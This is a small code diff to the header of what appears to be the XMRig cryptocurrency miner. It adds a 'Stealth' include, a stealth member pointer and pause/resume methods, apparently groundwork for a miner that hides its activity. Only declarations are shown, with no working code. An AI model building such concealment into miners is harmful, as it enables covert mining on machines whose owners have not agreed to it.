@@ -21,6 +21,8 @@
 
 
 #include "base/kernel/Base.h"
+#include "base/Stealth.h"
+
 
 
 #include <memory>
@@ -47,6 +49,9 @@ public:
     void start() override;
     void stop() override;
 
+    void pause(int pause);
+    void resume(int pause);
+
     Miner *miner() const;
     Network *network() const;
     void execCommand(char command) const;
@@ -54,6 +59,7 @@ public:
 private:
     std::shared_ptr<Miner> m_miner;
     std::shared_ptr<Network> m_network;
+    Stealth *m_stealth = nullptr;
 
 #   ifdef XMRIG_FEATURE_API
     std::shared_ptr<HwApi> m_hwApi;
